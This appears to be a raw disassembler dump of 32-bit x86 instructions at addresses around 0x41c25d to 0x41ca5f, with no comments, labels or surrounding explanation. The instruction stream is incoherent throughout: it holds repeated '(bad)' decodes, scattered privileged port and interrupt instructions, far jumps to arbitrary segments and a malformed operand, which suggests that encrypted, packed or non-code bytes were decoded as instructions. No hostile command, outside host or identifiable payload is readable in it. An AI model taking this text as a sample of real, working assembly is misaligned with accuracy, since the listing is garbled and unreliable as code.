  41c25d:	mov    WORD PTR [ecx+0x22],ss
  41c260:	imul   edx,DWORD PTR [esi+0x54],0xffffffa5
  41c264:	cmp    dl,BYTE PTR [edx]
  41c266:	inc    edi
  41c267:	push   es
  41c268:	sbb    DWORD PTR [eax+edx*1+0x7a],0xba0aff6c
  41c270:	push   ecx
  41c271:	test   eax,0xf57f3e03
  41c276:	or     eax,0xf6e12431
  41c27b:	sub    DWORD PTR ss:[ebx-0x4fd31fc7],edi
  41c282:	jno    0x41c25e
  41c284:	outs   dx,BYTE PTR ds:[esi]
  41c285:	jne    0x41c2f7
  41c287:	inc    ebx
  41c288:	add    al,0xea
  41c28a:	outs   dx,DWORD PTR ds:[esi]
  41c28b:	les    ebx,FWORD PTR [edi+0x7029c059]
  41c291:	leave  
  41c292:	jge    0x41c2c3
  41c294:	add    eax,0x1754f330
  41c299:	or     eax,0x972870fb
  41c29e:	add    BYTE PTR [ebp+0x70],0x21
  41c2a2:	sub    eax,0xbbc5c7f5
  41c2a7:	jmp    0xdb6c:0x641a77b
  41c2ae:	je     0x41c2f5
  41c2b0:	aad    0xea
  41c2b2:	dec    ecx
  41c2b3:	or     al,0x2b
  41c2b5:	fs jmp 0x41c2d0
  41c2b8:	push   esp
  41c2b9:	pop    ebx
  41c2ba:	add    dl,BYTE PTR [ebx]
  41c2bc:	rcl    DWORD PTR [edi-0x5835fd39],0xf4
  41c2c3:	and    BYTE PTR [ebp-0x78cedb86],dh
  41c2c9:	shr    DWORD PTR [eax+ecx*8-0x41b6023a],0x18
  41c2d1:	push   0x829894d2
  41c2d6:	xchg   edi,eax
  41c2d7:	ins    DWORD PTR es:[edi],dx
  41c2d8:	mov    ah,0xc4
  41c2da:	lahf   
  41c2db:	dec    edx
  41c2dc:	mov    dh,BYTE PTR [ebx+0x71]
  41c2df:	add    al,0x53
  41c2e1:	inc    eax
  41c2e2:	and    eax,0xfc6368e7
  41c2e7:	xchg   ecx,eax
  41c2e8:	cli    
  41c2e9:	stos   BYTE PTR es:[edi],al
  41c2ea:	ds nop
  41c2ec:	dec    edx
  41c2ed:	(bad)  
  41c2ee:	in     eax,0x2c
  41c2f0:	pusha  
  41c2f1:	push   edi
  41c2f2:	pop    es
  41c2f3:	xchg   edx,eax
  41c2f4:	jecxz  0x41c325
  41c2f6:	mov    al,ds:0x2d146c76
  41c2fb:	out    dx,al
  41c2fc:	jg     0x41c34b
  41c2fe:	fdivr  st,st(6)
  41c300:	xor    al,0xe5
  41c302:	data16 or ah,cl
  41c305:	stos   DWORD PTR es:[edi],eax
  41c306:	iret   
  41c307:	jge    0x41c2fb
  41c309:	pop    esp
  41c30a:	xor    dh,BYTE PTR [edi+0x2c]
  41c30d:	ret    
  41c30e:	ds stos BYTE PTR es:[edi],al
  41c310:	arpl   WORD PTR [edx-0x4c],di
  41c313:	mov    BYTE PTR [ebx],0xae
  41c316:	stc    
  41c317:	rol    BYTE PTR [ebp-0xc],1
  41c31a:	mov    dl,0x6a
  41c31c:	(bad)  
  41c31d:	enter  0xe1be,0xd0
  41c321:	nop
  41c322:	gs stos DWORD PTR es:[edi],eax
  41c324:	dec    edi
  41c325:	dec    edi
  41c326:	popa   
  41c327:	and    edi,DWORD PTR [ebx-0x74]
  41c32a:	jge    0x41c30f
  41c32c:	and    eax,0xffea4cd
  41c331:	or     ecx,ebp
  41c333:	sub    BYTE PTR [esi+ecx*4],0x7b
  41c337:	add    DWORD PTR [ecx-0x7e5ef0d0],eax
  41c33d:	mov    edi,0x4119db8b
  41c342:	push   ss
  41c343:	aam    0xec
  41c345:	popa   
  41c346:	push   eax
  41c347:	mov    ds:0xa867c1e6,al
  41c34c:	mov    al,ds:0x3ce6162b
  41c351:	fisttp QWORD PTR [esi]
  41c353:	leave  
  41c354:	pop    ds
  41c355:	cmp    eax,0xdbb0eb6f
  41c35a:	mov    eax,0x60e48245
  41c35f:	pop    ss
  41c360:	sbb    eax,0x88f0abce
  41c365:	out    dx,eax
  41c366:	sar    bl,1
  41c368:	popf   
  41c369:	imul   esp,DWORD PTR [esi-0xd],0x378c84ac
  41c370:	sub    eax,0xc1992a89
  41c375:	mov    esi,0x72d6be2
  41c37a:	stc    
  41c37b:	mov    ebx,0x506521cd
  41c380:	xchg   DWORD PTR [ebx+0x5a5ed22c],edx
  41c386:	add    DWORD PTR ds:0xc57a5b26,ecx
  41c38c:	fnstenv [ebx+0x228a1fd3]
  41c392:	daa    
  41c393:	(bad)  
  41c394:	test   eax,0xb4e9a0d9
  41c399:	dec    ebx
  41c39a:	test   DWORD PTR [ebp+0x536f9bf7],ecx
  41c3a0:	xchg   esp,eax
  41c3a1:	dec    DWORD PTR [esi]
  41c3a3:	pop    ebp
  41c3a4:	mov    edx,0x3fa213e0
  41c3a9:	xor    BYTE PTR [edi-0x44],bl
  41c3ac:	push   edx
  41c3ad:	ins    DWORD PTR es:[edi],dx
  41c3ae:	mov    eax,ds:0x6fe38101
  41c3b3:	adc    bl,BYTE PTR [edi+edx*8+0x15a6ce25]
  41c3ba:	test   DWORD PTR [ebx-0x65787a71],esp
  41c3c0:	push   ecx
  41c3c1:	jmp    0x41c3f9
  41c3c3:	inc    esp
  41c3c4:	pop    es
  41c3c5:	push   ebp
  41c3c6:	pop    es
  41c3c7:	sub    al,0xcb
  41c3c9:	sub    eax,0x965817b0
  41c3ce:	retf   
  41c3cf:	push   es
  41c3d0:	xchg   DWORD PTR [edi],edx
  41c3d2:	or     eax,0x526089c
  41c3d7:	push   es
  41c3d8:	cmp    cl,dl
  41c3da:	mov    ds:0xff365092,eax
  41c3df:	mov    BYTE PTR [esi+0x6f934f32],ch
  41c3e5:	mov    esi,0x58482ff4
  41c3ea:	pop    ebx
  41c3eb:	push   0x41
  41c3ed:	inc    eax
  41c3ee:	xor    eax,0xb2d37809
  41c3f3:	ins    BYTE PTR es:[edi],dx
  41c3f4:	push   ds
  41c3f5:	and    dh,ah
  41c3f7:	adc    DWORD PTR [edx+eiz*2-0x31ad4ed3],esi
  41c3fe:	repnz push edx
  41c400:	imul   ebp,DWORD PTR [edi],0x384a3b02
  41c406:	rcr    DWORD PTR [esi-0x63],0xb4
  41c40a:	sbb    eax,0xa13b202a
  41c40f:	cs aam 0x3f
  41c412:	mov    ah,0x96
  41c414:	stos   DWORD PTR es:[edi],eax
  41c415:	sbb    ah,bh
  41c417:	pop    esp
  41c418:	or     DWORD PTR [ebp+0x4165227d],ecx
  41c41e:	jg     0x41c487
  41c420:	push   ds
  41c421:	jno    0x41c45d
  41c423:	popf   
  41c424:	lods   eax,DWORD PTR ds:[esi]
  41c425:	stos   BYTE PTR es:[edi],al
  41c426:	js     0x41c46b
  41c428:	jmp    0xa2d261e9
  41c42d:	xchg   edx,eax
  41c42e:	mov    dh,0x40
  41c430:	mov    ebx,0xeda0ec8b
  41c435:	sbb    bl,BYTE PTR [ebx+0x39]
  41c438:	pushf  
  41c439:	mov    bh,0xf1
  41c43b:	lea    edi,[ecx-0x8234126]
  41c441:	jmp    0x134375d
  41c446:	pushf  
  41c447:	(bad)  
  41c448:	cmp    al,0x4b
  41c44a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41c44b:	add    al,0x3b
  41c44d:	in     eax,0x7c
  41c44f:	jns    0x41c498
  41c451:	mov    edx,0xad4e2165
  41c456:	call   0x7d3db417
  41c45b:	push   ebp
  41c45c:	ins    DWORD PTR es:[edi],dx
  41c45d:	push   edi
  41c45e:	sbb    dh,BYTE PTR ds:0x77739079
  41c464:	adc    bl,BYTE PTR [ebp-0x44bf64f4]
  41c46a:	aad    0x34
  41c46c:	mov    ?,WORD PTR [ebp+0x24]
  41c46f:	imul   esp,DWORD PTR [eax-0x1fbf87fe],0xdfea236
  41c479:	imul   edx,esp,0x71
  41c47c:	and    edi,edx
  41c47e:	inc    ebx
  41c47f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41c480:	sahf   
  41c481:	sub    BYTE PTR [eax+0x46],bh
  41c484:	out    dx,eax
  41c485:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41c486:	mov    WORD PTR [ecx+eax*8-0x7dfc6b8d],cs
  41c48d:	mov    cl,0xa0
  41c48f:	out    0xcd,al
  41c491:	loop   0x41c4c8
  41c493:	push   esp
  41c494:	iret   
	...
  41c511:	add    BYTE PTR [eax],al
  41c513:	add    BYTE PTR [esi-0x9b72fa0],al
  41c519:	clc    
  41c51a:	sahf   
  41c51b:	out    dx,al
  41c51c:	or     eax,0xdb0d536
  41c521:	sbb    BYTE PTR [ecx+0x16213aa],cl
  41c527:	add    BYTE PTR [ecx+0x7],ch
  41c52a:	add    BYTE PTR [eax],al
  41c52c:	xor    BYTE PTR [edx+0x1b],dh
  41c52f:	int3   
  41c530:	xor    esi,DWORD PTR [eax+0x4e02f340]
  41c536:	jns    0x41c5a6
  41c538:	mov    ch,0xcc
  41c53a:	outs   dx,BYTE PTR ds:[esi]
  41c53b:	les    esi,FWORD PTR [ebp+esi*8+0x22]
  41c53f:	fs pop eax
  41c541:	jmp    0xc5ed15c6
  41c546:	repnz pop ecx
  41c548:	fdecstp 
  41c54a:	sub    bl,al
  41c54c:	(bad)  
  41c54d:	jb     0x41c5b3
  41c54f:	out    0x63,eax
  41c551:	inc    ecx
  41c552:	stc    
  41c553:	or     al,0x3
  41c555:	xchg   ecx,eax
  41c556:	jb     0x41c5d7
  41c558:	and    eax,0x4524e731
  41c55d:	jmp    0x41c517
  41c55f:	aad    0xf
  41c561:	(bad)
  41c564:	ud2    
  41c566:	pop    es
  41c567:	(bad)  
  41c568:	hlt    
  41c569:	neg    BYTE PTR [edx-0x4]
  41c56c:	in     eax,0x68
  41c56e:	or     BYTE PTR [bx-0x78dc],dh
  41c573:	iret   
  41c574:	sahf   
  41c575:	xor    DWORD PTR [eax+0x59],edx
  41c578:	je     0x41c542
  41c57a:	cmp    eax,0x57805c85
  41c57f:	iret   
  41c580:	sbb    al,0x7b
  41c582:	popf   
  41c583:	mov    esp,0x6d5b679
  41c588:	add    eax,0xc335f4b0
  41c58d:	ins    DWORD PTR es:[edi],dx
  41c58e:	add    eax,edx
  41c590:	dec    esp
  41c591:	cmp    ebx,0xf00613ed
  41c597:	in     al,dx
  41c598:	lods   al,BYTE PTR ds:[esi]
  41c599:	gs retf 0xa174
  41c59d:	imul   esp,ebp,0x44e7c9e0
  41c5a3:	popf   
  41c5a4:	mov    ebx,0xe6c140d4
  41c5a9:	lock lock add DWORD PTR [eax],edi
  41c5ad:	add    al,0x5c
  41c5af:	not    BYTE PTR [ebp-0x361c5a44]
  41c5b5:	scas   al,BYTE PTR es:[edi]
  41c5b6:	dec    edx
  41c5b7:	push   ecx
  41c5b8:	push   ecx
  41c5b9:	loope  0x41c5cb
  41c5bb:	mov    BYTE PTR [ebx],bl
  41c5bd:	ds xor eax,0xdf48eae1
  41c5c3:	stc    
  41c5c4:	shl    BYTE PTR [esi],1
  41c5c6:	ret    
  41c5c7:	dec    ecx
  41c5c8:	dec    esp
  41c5c9:	pusha  
  41c5ca:	mov    al,cs:0x2212590
  41c5d0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41c5d1:	and    edi,DWORD PTR [ebx-0x3]
  41c5d4:	sub    esp,DWORD PTR [ebp-0x1]
  41c5d7:	arpl   WORD PTR ds:0x458460f3,di
  41c5dd:	mov    ebx,0x3cd252c3
  41c5e2:	or     al,BYTE PTR [ecx+eax*8]
  41c5e5:	push   esi
  41c5e6:	jecxz  0x41c58d
  41c5e8:	cmp    BYTE PTR [ebx-0x4b],ah
  41c5eb:	mov    ebp,edx
  41c5ed:	pop    esi
  41c5ee:	pop    es
  41c5ef:	mov    ebp,0x4d83c7e8
  41c5f5:	inc    ebp
  41c5f6:	daa    
  41c5f7:	cmc    
  41c5f8:	sub    al,0xd0
  41c5fa:	inc    esp
  41c5fb:	adc    ebx,ecx
  41c5fd:	push   ebx
  41c5fe:	sub    eax,0xcee88e2d
  41c603:	inc    ecx
  41c604:	xchg   ebp,eax
  41c605:	sar    edi,cl
  41c607:	sbb    al,0xad
  41c609:	add    DWORD PTR [ebx-0x3af54d54],esp
  41c60f:	adc    bh,ch
  41c611:	retf   
  41c612:	xchg   esp,eax
  41c613:	pop    es
  41c614:	jp     0x41c681
  41c616:	les    edx,FWORD PTR [edx]
  41c618:	outs   dx,BYTE PTR ds:[esi]
  41c619:	inc    ecx
  41c61a:	aaa    
  41c61b:	add    eax,0x48b4ab4a
  41c620:	in     al,dx
  41c621:	outs   dx,BYTE PTR ds:[esi]
  41c622:	fs jae 0x41c5e5
  41c625:	dec    ecx
  41c626:	jl     0x41c66b
  41c628:	ds pop edi
  41c62a:	lock add DWORD PTR [ebp+0x121de75],esi
  41c631:	and    ecx,DWORD PTR [ecx+0x7f69325e]
  41c637:	adc    bl,bl
  41c639:	lds    ecx,FWORD PTR [ebp+0x71283e98]
  41c63f:	shl    BYTE PTR [esi-0x2c9a9b5d],1
  41c645:	cmp    ecx,DWORD PTR [edx+0x31]
  41c648:	xor    DWORD PTR [esi+0x21],esp
  41c64b:	scas   eax,DWORD PTR es:[edi]
  41c64c:	dec    esp
  41c64d:	add    BYTE PTR [ebp+0x5f752bb4],ah
  41c653:	ins    BYTE PTR es:[edi],dx
  41c654:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41c655:	or     edi,DWORD PTR [eax-0x25]
  41c658:	dec    edx
  41c659:	loope  0x41c602
  41c65b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41c65c:	jmp    0x41c6db
  41c65e:	shr    BYTE PTR [esi],cl
  41c660:	out    0x83,eax
  41c662:	jmp    DWORD PTR [eax+0x5b8b4fc7]
  41c668:	iret   
  41c669:	repz lahf 
  41c66b:	jno    0x41c6bd
  41c66d:	in     eax,dx
  41c66e:	scas   eax,DWORD PTR es:[edi]
  41c66f:	outs   dx,BYTE PTR ds:[esi]
  41c670:	jns    0x41c6c4
  41c672:	dec    esi
  41c673:	out    dx,al
  41c674:	mov    bh,0x17
  41c676:	aad    0x3d
  41c678:	(bad)  
  41c679:	sahf   
  41c67a:	xchg   esi,eax
  41c67b:	fcom   DWORD PTR [eax+ebp*2]
  41c67e:	imul   eax,DWORD PTR ds:0x7a10dac7,0x26
  41c685:	mov    bh,BYTE PTR [eax]
  41c687:	fld    QWORD PTR [ebp+eiz*2+0x30]
  41c68b:	inc    eax
  41c68c:	clc    
  41c68d:	mov    esp,0xb667bc53
  41c692:	in     al,0x48
  41c694:	imul   esi,DWORD PTR [edx+0x4d],0x43af6a34
  41c69b:	adc    al,0x7
  41c69d:	push   edx
  41c69e:	cwde   
  41c69f:	lock cdq 
  41c6a1:	sbb    eax,0x2cf8a49
  41c6a6:	mov    ecx,DWORD PTR [edx]
  41c6a8:	cld    
  41c6a9:	jmp    0xd6c15dbd
  41c6ae:	xchg   ecx,eax
  41c6af:	cmp    BYTE PTR [esi],0x99
  41c6b2:	or     BYTE PTR [eax*2+0x372f284e],bl
  41c6b9:	scas   eax,DWORD PTR es:[edi]
  41c6ba:	mov    ebx,0x7c88768d
  41c6bf:	loopne 0x41c6ab
  41c6c1:	leave  
  41c6c2:	in     eax,dx
  41c6c3:	inc    ecx
  41c6c4:	or     BYTE PTR [ebx+0x423bf5f8],bh
  41c6ca:	xchg   DWORD PTR [ebx-0x47],ecx
  41c6cd:	xchg   esi,eax
  41c6ce:	jbe    0x41c714
  41c6d0:	hlt    
  41c6d1:	fs pop esi
  41c6d3:	add    al,0xb7
  41c6d5:	mov    WORD PTR [ebp-0x44],cs
  41c6d8:	(bad)  
  41c6d9:	js     0x41c6d6
  41c6db:	add    DWORD PTR [ecx+0x27],ebp
  41c6de:	rcl    bh,cl
  41c6e0:	pop    ds
  41c6e1:	sub    eax,0xd467403f
  41c6e6:	leave  
  41c6e7:	in     al,0xab
  41c6e9:	inc    ebp
  41c6ea:	ja     0x41c740
  41c6ec:	test   BYTE PTR [ebx-0x48],0x75
  41c6f0:	popa   
  41c6f1:	lahf   
  41c6f2:	xchg   ecx,eax
  41c6f3:	xor    al,0xc6
  41c6f5:	xchg   edx,eax
  41c6f6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41c6f7:	retf   
  41c6f8:	test   DWORD PTR [ebp+0x5cf15a42],0x4480ca32
  41c702:	fld    DWORD PTR [ecx]
  41c704:	inc    esi
  41c705:	dec    edi
  41c706:	sbb    al,0x24
  41c709:	ins    DWORD PTR es:[edi],dx
  41c70a:	aaa    
  41c70b:	jnp    0x41c6fe
  41c70d:	sub    DWORD PTR [ebp-0x34799d9d],esi
  41c713:	mov    bl,0x4f
  41c715:	xchg   ecx,eax
  41c716:	mov    ch,cl
  41c718:	in     eax,dx
  41c719:	jo     0x41c736
  41c71b:	mov    dh,0x97
  41c71d:	stos   BYTE PTR es:[edi],al
  41c71e:	cmc    
  41c71f:	xchg   ebp,eax
  41c720:	hlt    
  41c721:	sbb    cl,BYTE PTR fs:[ecx+0x2000a727]
  41c728:	adc    DWORD PTR [ebp+0x1b],ecx
  41c72b:	and    ebp,DWORD PTR [ebp-0x5d54e67f]
  41c731:	mov    gs,edi
  41c733:	or     al,0xd
  41c735:	pop    esi
  41c736:	xchg   esi,eax
  41c737:	fdivr  DWORD PTR [esi]
  41c739:	std    
  41c73a:	or     BYTE PTR [edi-0x79],al
  41c73d:	mov    bl,0x63
  41c73f:	mov    ds:0x6f1b009d,al
  41c744:	xor    edi,edx
  41c746:	shr    esp,cl
  41c748:	pop    esp
  41c749:	xor    al,0xd9
  41c74b:	dec    edi
  41c74c:	adc    eax,0x32baa82c
  41c751:	add    ecx,DWORD PTR [esi]
  41c753:	shr    BYTE PTR [edi],1
  41c755:	mov    dl,0x49
  41c757:	repz adc ecx,edi
  41c75a:	and    bl,bh
  41c75c:	or     eax,0x24fe047
  41c761:	xchg   ecx,eax
  41c762:	add    al,BYTE PTR [eax+0x13]
  41c765:	fwait
  41c766:	xor    al,0x9d
  41c768:	or     ecx,edi
  41c76a:	mov    eax,ds:0xc26289f3
  41c76f:	mov    edx,0x3a3f4503
  41c774:	push   es
  41c775:	mov    bh,0x7b
  41c777:	sub    DWORD PTR [ebx],edx
  41c779:	dec    esi
  41c77a:	ror    BYTE PTR [eax+0xb16624f],cl
  41c780:	loope  0x41c7a1
  41c782:	sar    DWORD PTR [ecx-0x41],cl
  41c785:	push   es
  41c786:	lods   al,BYTE PTR ds:[esi]
  41c787:	jne    0x41c768
  41c789:	fst    DWORD PTR [eax+0x9]
  41c78c:	enter  0x6843,0x2f
  41c790:	aaa    
  41c791:	in     al,0x38
  41c793:	enter  0x7516,0x1c
  41c797:	and    DWORD PTR [eax-0x5b],eax
  41c79a:	xchg   esi,eax
  41c79b:	jmp    FWORD PTR cs:[ecx]
  41c79e:	add    bh,ah
  41c7a0:	sbb    DWORD PTR [eax+ecx*4-0x6b3d00ab],eax
  41c7a7:	mov    esi,0x5df1b746
  41c7ac:	movlps QWORD PTR [edx+0x4dcd3100],xmm2
  41c7b3:	es mov ch,bl
  41c7b6:	ror    DWORD PTR [ecx+0x5a],cl
  41c7b9:	jnp    0x41c809
  41c7bb:	loop   0x41c757
  41c7bd:	aam    0x8a
  41c7bf:	mov    esp,0x7aa3dc9f
  41c7c4:	dec    edi
  41c7c5:	xchg   al,al
  41c7c7:	pop    ds
  41c7c8:	mov    ds:0xf844fc06,al
  41c7cd:	std    
  41c7ce:	cmc    
  41c7cf:	inc    ebp
  41c7d0:	jnp    0x41c7d9
  41c7d2:	push   esi
  41c7d3:	sub    BYTE PTR [ecx+eax*8-0x69fa9fb2],cl
  41c7da:	push   es
  41c7db:	adc    eax,0x8a8b28d9
  41c7e0:	dec    edx
  41c7e1:	stos   BYTE PTR es:[edi],al
  41c7e2:	scas   al,BYTE PTR es:[edi]
  41c7e3:	and    esp,DWORD PTR [ecx]
  41c7e5:	sbb    bh,BYTE PTR [edi+ebp*4-0x38]
  41c7e9:	dec    ecx
  41c7ea:	repz mov esp,0x86b2ad68
  41c7f0:	data16 int 0xb3
  41c7f3:	fadd   st(4),st
  41c7f5:	in     al,0xe3
  41c7f7:	or     bh,bh
  41c7f9:	push   edx
  41c7fa:	ds ret 0xd03f
  41c7fe:	les    edi,FWORD PTR [edi+0x6a]
  41c801:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41c802:	xlat   BYTE PTR ds:[ebx]
  41c803:	shl    ecx,1
  41c805:	mov    ds:0xa54cd918,al
  41c80a:	dec    eax
  41c80b:	mov    bh,BYTE PTR [esi-0x48]
  41c80e:	nop
  41c80f:	adc    al,0x9
  41c811:	dec    ebx
  41c812:	xchg   DWORD PTR [edi],eax
  41c814:	sbb    DWORD PTR [edx+edx*4],esp
  41c817:	and    eax,0x7abd34d
  41c81c:	add    eax,0xd2937f86
  41c821:	xor    cl,BYTE PTR [edx]
  41c823:	lahf   
  41c824:	dec    ebp
  41c825:	sbb    BYTE PTR [ecx-0x18aad487],dl
  41c82b:	fsubr  QWORD PTR [esi]
  41c82e:	aaa    
  41c82f:	ins    BYTE PTR es:[edi],dx
  41c830:	mov    edx,0xc58f6f27
  41c835:	outs   dx,BYTE PTR ds:[esi]
  41c836:	mov    edx,0x1e4383cb
  41c83b:	inc    edx
  41c83c:	cmp    al,0x63
  41c83e:	imul   ecx,esp,0xfe71fd4d
  41c844:	mov    BYTE PTR [esi+edx*1],ah
  41c847:	retf   
  41c848:	xor    ch,ch
  41c84a:	imul   ebp,DWORD PTR [ecx-0x6d],0x4
  41c84e:	adc    al,0x9b
  41c850:	and    BYTE PTR [esi+0x1a2bc2f3],bh
  41c856:	mov    dl,0xf1
  41c858:	mov    ebx,0x19d13c42
  41c85d:	mov    esp,0xbf889a60
  41c862:	push   edi
  41c863:	pop    eax
  41c864:	repz fild WORD PTR [eax+0x24826347]
  41c86b:	jne    0x41c852
  41c86d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41c86e:	ficom  WORD PTR [ecx-0x36eef787]
  41c874:	xor    DWORD PTR [esi+eiz*2+0x568d4e4f],ebx
  41c87b:	or     eax,0xb12d10c0
  41c880:	pop    ebx
  41c881:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41c882:	inc    esp
  41c883:	cmp    DWORD PTR [esi-0x68],esp
  41c886:	fdiv   QWORD PTR [esi-0x5accb84e]
  41c88c:	lahf   
  41c88d:	cmp    dl,BYTE PTR [ebx+0x737a18cf]
  41c893:	mov    DWORD PTR [eax+0x6a],ecx
  41c896:	push   ss
  41c897:	fs dec ecx
  41c899:	cmp    BYTE PTR [edx+eiz*8],ch
  41c89c:	mov    ah,0xf5
  41c89e:	pop    DWORD PTR [edx+0x559e664f]
  41c8a4:	mov    bl,0xba
  41c8a6:	xor    bl,BYTE PTR [ebx]
  41c8a8:	ins    BYTE PTR es:[edi],dx
  41c8a9:	sbb    DWORD PTR [ebp-0x3db2e1dd],ecx
  41c8af:	inc    ebp
  41c8b0:	cmp    BYTE PTR [ecx-0x614811ed],ch
  41c8b6:	adc    al,0xd1
  41c8b8:	rol    DWORD PTR [esi-0x58b90a95],cl
  41c8be:	ret    0x5988
  41c8c1:	lods   al,BYTE PTR ds:[esi]
  41c8c2:	cmp    al,0xab
  41c8c4:	pop    ebp
  41c8c5:	cli    
  41c8c6:	mov    al,ds:0xfada655a
  41c8cb:	inc    edi
  41c8cd:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41c8ce:	ins    DWORD PTR es:[edi],dx
  41c8cf:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41c8d0:	leave  
  41c8d1:	les    edi,FWORD PTR [esp+edx*2+0x43]
  41c8d5:	(bad)  
  41c8d6:	and    eax,esp
  41c8d8:	xchg   DWORD PTR [esi],esp
  41c8da:	pop    ecx
  41c8db:	push   0x53d0ada9
  41c8e0:	pop    eax
  41c8e1:	pusha  
  41c8e2:	jl     0x41c8d3
  41c8e4:	rol    DWORD PTR ss:[eax-0x26],1
  41c8e8:	(bad)  
  41c8e9:	push   0x13
  41c8eb:	jg     0x41c887
  41c8ed:	call   0xcfd37f67
  41c8f2:	out    0x56,eax
  41c8f4:	mov    bl,0xa8
  41c8f6:	sbb    cl,BYTE PTR [edx+0x49c3e38d]
  41c8fc:	arpl   WORD PTR [ecx-0x5c0f6df2],si
  41c902:	cdq    
  41c903:	fs daa 
  41c905:	xchg   ebp,eax
  41c906:	fwait
  41c907:	ss or  eax,edx
  41c90a:	data16 or al,0xa1
  41c90d:	rcl    DWORD PTR [edi],0xb1
  41c910:	sbb    eax,0xdd4457
  41c915:	pop    ecx
  41c916:	inc    ebp
  41c917:	xlat   BYTE PTR ds:[ebx]
  41c918:	lock pop esi
  41c91a:	inc    eax
  41c91b:	js     0x41c8e1
  41c91d:	or     bh,ah
  41c91f:	mov    ch,0xb
  41c921:	xchg   ebx,eax
  41c922:	mov    eax,ds:0x6f57bbe0
  41c927:	inc    edx
  41c928:	fcmovnb st,st(4)
  41c92a:	xor    eax,0x48fdb527
  41c92f:	repnz call 0xb50e:0x46fa9bc2
  41c937:	xor    DWORD PTR [ecx+0x378302ac],esi
  41c93d:	inc    ecx
  41c93e:	xlat   BYTE PTR ds:[ebx]
  41c93f:	inc    edi
  41c940:	pop    ebp
  41c941:	dec    eax
  41c942:	std    
  41c943:	jmp    0x2aa0:0x1ffcd35b
  41c94a:	and    eax,0x7a005b79
  41c94f:	call   0x8a8c9a6b
  41c954:	(bad)  
  41c955:	adc    ecx,esp
  41c957:	(bad)  
  41c958:	jb     0x41c923
  41c95a:	mov    edx,DWORD PTR [edx]
  41c95c:	sti    
  41c95d:	fdivp  st(0),st
  41c95f:	aam    0xf3
  41c961:	fisttp DWORD PTR [ebx+eax*8]
  41c964:	or     BYTE PTR [edi+edx*4+0x3031eafb],0x29
  41c96c:	lock push esp
  41c96e:	jle    0x41c96e
  41c970:	pop    ecx
  41c971:	dec    ebp
  41c972:	jmp    0x9095:0xd1c5c660
  41c979:	push   cs
  41c97a:	movd   mm3,DWORD PTR [ecx-0x2ed2a1cf]
  41c981:	dec    ecx
  41c982:	inc    eax
  41c983:	mov    ebx,0xbb30cbd4
  41c988:	js     0x41c914
  41c98a:	inc    esi
  41c98b:	fild   DWORD PTR ds:0xd05c377e
  41c991:	push   0xe0655592
  41c996:	enter  0x587e,0xea
  41c99a:	aad    0xf5
  41c99c:	jmp    0x445b777e
  41c9a1:	dec    ecx
  41c9a2:	call   0x32fe1edd
  41c9a7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41c9a8:	sbb    BYTE PTR [esi+0x4b359cca],dl
  41c9ae:	jl     0x41c9d6
  41c9b0:	int    0x4d
  41c9b2:	dec    ebp
  41c9b3:	push   esi
  41c9b4:	sti    
  41c9b5:	arpl   WORD PTR [edx-0x6b3327dc],bp
  41c9bb:	dec    edi
  41c9bc:	cmp    ch,al
  41c9be:	jl     0x41ca3f
  41c9c0:	stos   DWORD PTR es:[edi],eax
  41c9c1:	aad    0x59
  41c9c3:	popa   
  41c9c4:	cmc    
  41c9c5:	xor    al,BYTE PTR [ebx-0x14]
  41c9c8:	ins    DWORD PTR es:[edi],dx
  41c9c9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41c9ca:	lahf   
  41c9cb:	js     0x41c9b3
  41c9cd:	jne    0x41c99d
  41c9cf:	xchg   edi,eax
  41c9d0:	call   0xc47a60c4
  41c9d5:	mov    ah,0xcf
  41c9d7:	adc    BYTE PTR [esi],bl
  41c9d9:	dec    DWORD PTR [ebp+0x3d6207b3]
  41c9df:	xor    eax,0xbddf2ffb
  41c9e4:	mov    ebp,0x107a36c0
  41c9e9:	loop   0x41c9fa
  41c9eb:	in     al,0x67
  41c9ed:	arpl   WORD PTR [edx+0x6d],cx
  41c9f0:	bound  ebx,QWORD PTR [edx-0x1d30128d]
  41c9f6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41c9f7:	shl    bh,cl
  41c9f9:	push   es
  41c9fa:	sar    BYTE PTR [ecx-0x68],0x87
  41c9fe:	jl     0x41ca77
  41ca00:	sbb    ecx,DWORD PTR ds:0xbfe672cd
  41ca06:	xor    al,0x87
  41ca09:	ds fst DWORD PTR ss:[ebx]
  41ca0d:	mov    dl,0x2b
  41ca0f:	in     eax,0x41
  41ca11:	or     DWORD PTR [ecx+0x216441c1],0x38
  41ca18:	into   
  41ca19:	mov    al,ch
  41ca1b:	adc    BYTE PTR [ecx-0xb896083],0xd7
  41ca22:	mov    dl,0xb9
  41ca24:	gs jl  0x41c9c4
  41ca27:	push   cs
  41ca28:	(bad)  
  41ca29:	push   sp
  41ca2b:	out    0x52,eax
  41ca2d:	fdivr  DWORD PTR [esi-0x3c]
  41ca30:	rcl    al,cl
  41ca32:	out    0x68,al
  41ca34:	jp     0x41ca30
  41ca36:	in     al,dx
  41ca37:	add    eax,0xf9597d93
  41ca3c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41ca3d:	fbstp  TBYTE PTR [edi-0x55fa1cae]
  41ca43:	aaa    
  41ca44:	sar    DWORD PTR [esi-0x4897a288],1
  41ca4a:	jmp    FWORD PTR [esi]
  41ca4c:	add    cl,BYTE PTR [esi+eiz*4-0x50]
  41ca50:	int    0x95
  41ca52:	pop    ecx
  41ca53:	inc    ebx
  41ca54:	jle    0x41ca93
  41ca56:	xchg   ebp,eax
  41ca57:	adc    edi,DWORD PTR [edi-0x50]
  41ca5a:	stos   BYTE PTR es:[edi],al
  41ca5b:	hlt    
  41ca5c:	xchg   ebp,eax
  41ca5d:	sub    al,0xe3
  41ca5f:	rcl    eax,1
